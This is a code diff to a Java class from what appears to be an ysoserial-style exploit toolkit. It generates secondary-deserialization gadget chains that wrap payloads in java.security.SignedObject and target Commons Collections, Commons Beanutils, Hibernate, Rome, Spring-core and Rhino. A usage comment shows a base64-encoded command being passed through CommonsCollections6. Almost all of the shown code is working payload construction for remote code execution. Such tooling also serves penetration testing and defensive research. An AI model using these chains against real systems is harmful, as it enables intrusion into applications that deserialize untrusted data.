@@ -17,6 +17,7 @@ import org.mozilla.javascript.tools.shell.Environment;
 import org.springframework.beans.factory.ObjectFactory;
 
 import java.io.ByteArrayOutputStream;
+import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.io.Serializable;
 import java.lang.reflect.Constructor;
@@ -38,9 +39,9 @@ import static java.lang.Class.forName;
  * 1. InvokerTransformer 调用任意方法（依赖 CC）
  * 2. BeanComparator 调用 getter 方法（依赖 CB）
  * 3. BasicPropertyAccessor$BasicGetter 调用 getter 方法(依赖 Hibernate)
- * 4. MemberBox 反射调用任意方法（依赖 rhino）
- * 5. ToStringBean 调用全部 getter 方法（依赖 Rome）
- * 6. MethodInvokeTypeProvider 反射调用任意方法（依赖 spring-core）
+ * 4. ToStringBean 调用全部 getter 方法（依赖 Rome）
+ * 5. MethodInvokeTypeProvider 反射调用任意方法（依赖 spring-core）
+ * 6. MemberBox 反射调用任意方法（依赖 rhino）
  * <p>
  * 利用方式：
  * SignedObject 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:10000' 20000
@@ -48,8 +49,9 @@ import static java.lang.Class.forName;
  * @author nu1r
  */
 public class SignedObject implements ObjectPayload<Object> {
-    public byte[] getBytes(PayloadType type) throws Exception {
-        String   command  = String.valueOf(type);
+
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String command = param[0];
         String[] commands = command.split(":");
 
         if (commands.length < 3) {
@@ -78,8 +80,13 @@ public class SignedObject implements ObjectPayload<Object> {
         }
     }
 
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
+    }
 
-    public static Object getOriginal(String[] args) throws Exception {
+
+    public Object getOriginal(String[] args) throws Exception {
         final String payloadType = args[0];
         String       command     = args[1];
 
@@ -104,7 +111,7 @@ public class SignedObject implements ObjectPayload<Object> {
 
 
     // CC 无数组二次反序列化
-    public static byte[] getSignedObjectWithCCNoArray(Object serObj) throws Exception {
+    public byte[] getSignedObjectWithCCNoArray(Object serObj) throws Exception {
         Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
 
         Map          old    = new HashMap();
@@ -127,7 +134,7 @@ public class SignedObject implements ObjectPayload<Object> {
     }
 
     // CC4 无 TiedMapEntry 二次反序列化
-    public static byte[] getSignedObjectWithCC4(Object serObj) throws Exception {
+    public byte[] getSignedObjectWithCC4(Object serObj) throws Exception {
         Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
 
         org.apache.commons.collections4.functors.InvokerTransformer transformer = new org.apache.commons.collections4.functors.InvokerTransformer("toString", new Class[0], new Object[0]);
@@ -147,7 +154,7 @@ public class SignedObject implements ObjectPayload<Object> {
 
 
     // CB 二次反序列化
-    public static byte[] getSignedObjectWithCB(Object serObj) throws Exception {
+    public byte[] getSignedObjectWithCB(Object serObj) throws Exception {
         Object obj = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
 
         final BeanComparator        comparator = new BeanComparator("lowestSetBit");
@@ -168,7 +175,7 @@ public class SignedObject implements ObjectPayload<Object> {
     }
 
     // Hibernate 二次反序列化
-    public static byte[] getSignedObjectWithHibernate(Object serObj) throws Exception {
+    public byte[] getSignedObjectWithHibernate(Object serObj) throws Exception {
         Object obj     = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
         Object getters = makeGetter(obj.getClass(), "getObject");
 
@@ -183,7 +190,7 @@ public class SignedObject implements ObjectPayload<Object> {
 
 
     // Rome 二次反序列化
-    public static byte[] getSignedObjectWithRome(Object serObj) throws Exception {
+    public byte[] getSignedObjectWithRome(Object serObj) throws Exception {
         Object     obj      = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
         ObjectBean delegate = new ObjectBean(java.security.SignedObject.class, obj);
         ObjectBean root     = new ObjectBean(ObjectBean.class, delegate);
@@ -198,50 +205,8 @@ public class SignedObject implements ObjectPayload<Object> {
     }
 
 
-    // Rhino 二次反序列化
-    public byte[] getSignedObjectWithRhino(Object serObj) throws Exception {
-        Object              obj              = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
-        ScriptableObject    dummyScope       = new Environment();
-        Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
-        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
-        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);
-        Object           initContextMemberBox        = Reflections.createWithConstructor(Class.forName("org.mozilla.javascript.MemberBox"), (Class<Object>) Class.forName("org.mozilla.javascript.MemberBox"), new Class[]{Method.class}, new Object[]{Context.class.getMethod("enter")});
-        ScriptableObject initContextScriptableObject = new Environment();
-        Method           makeSlot                    = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
-        Reflections.setAccessible(makeSlot);
-        Object slot = makeSlot.invoke(initContextScriptableObject, "nu1r", 0, 4);
-        Reflections.setFieldValue(slot, "getter", initContextMemberBox);
-        NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
-        Reflections.setFieldValue(initContextNativeJavaObject, "parent", dummyScope);
-        Reflections.setFieldValue(initContextNativeJavaObject, "isAdapter", true);
-        Reflections.setFieldValue(initContextNativeJavaObject, "adapter_writeAdapterObject", this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
-        Reflections.setFieldValue(initContextNativeJavaObject, "javaObject", initContextScriptableObject);
-        ScriptableObject scriptableObject = new Environment();
-        scriptableObject.setParentScope(initContextNativeJavaObject);
-        makeSlot.invoke(scriptableObject, "object", 0, 2);
-        NativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);
-        Reflections.setFieldValue(nativeJavaArray, "parent", dummyScope);
-        Reflections.setFieldValue(nativeJavaArray, "javaObject", obj);
-        nativeJavaArray.setPrototype(scriptableObject);
-        Reflections.setFieldValue(nativeJavaArray, "prototype", scriptableObject);
-        NativeJavaObject nativeJavaObject = new NativeJavaObject();
-        Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
-        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
-        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject", this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
-        Reflections.setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);
-
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(nativeJavaObject);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-
     // Spring-Core 二次反序列化
-    public static byte[] getSignedObjectWithSpring(Object serObj) throws Exception {
+    public byte[] getSignedObjectWithSpring(Object serObj) throws Exception {
         Object        obj                = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
         ObjectFactory objectFactoryProxy = Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", obj), ObjectFactory.class);
         Type          typeTemplatesProxy = Gadgets.createProxy((InvocationHandler) Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").newInstance(objectFactoryProxy), Type.class, java.security.SignedObject.class);
@@ -260,8 +225,45 @@ public class SignedObject implements ObjectPayload<Object> {
         return bytes;
     }
 
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+    // Rhino 二次反序列化
+    public byte[] getSignedObjectWithRhino(Object serObj) throws Exception {
+        Object              obj              = SignedObjectUtils.warpWithSignedObject((Serializable) serObj);
+        ScriptableObject    dummyScope       = new Environment();
+        Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
+        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
+        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);
+        Object           initContextMemberBox        = Reflections.createWithConstructor(Class.forName("org.mozilla.javascript.MemberBox"), (Class<Object>) Class.forName("org.mozilla.javascript.MemberBox"), new Class[]{Method.class}, new Object[]{Context.class.getMethod("enter")});
+        ScriptableObject initContextScriptableObject = new Environment();
+        Method           makeSlot                    = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
+        Reflections.setAccessible(makeSlot);
+        Object slot = makeSlot.invoke(initContextScriptableObject, "su18", 0, 4);
+        Reflections.setFieldValue(slot, "getter", initContextMemberBox);
+        NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
+        Reflections.setFieldValue(initContextNativeJavaObject, "parent", dummyScope);
+        Reflections.setFieldValue(initContextNativeJavaObject, "isAdapter", true);
+        Reflections.setFieldValue(initContextNativeJavaObject, "adapter_writeAdapterObject", this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
+        Reflections.setFieldValue(initContextNativeJavaObject, "javaObject", initContextScriptableObject);
+        ScriptableObject scriptableObject = new Environment();
+        scriptableObject.setParentScope(initContextNativeJavaObject);
+        makeSlot.invoke(scriptableObject, "object", 0, 2);
+        NativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);
+        Reflections.setFieldValue(nativeJavaArray, "parent", dummyScope);
+        Reflections.setFieldValue(nativeJavaArray, "javaObject", obj);
+        nativeJavaArray.setPrototype(scriptableObject);
+        Reflections.setFieldValue(nativeJavaArray, "prototype", scriptableObject);
+        NativeJavaObject nativeJavaObject = new NativeJavaObject();
+        Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
+        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
+        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
+                this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
+        Reflections.setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);
+
+        ByteArrayOutputStream baous = new ByteArrayOutputStream();
+        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
+        oos.writeObject(nativeJavaObject);
+        byte[] bytes = baous.toByteArray();
+        oos.close();
+
+        return bytes;
     }
 }
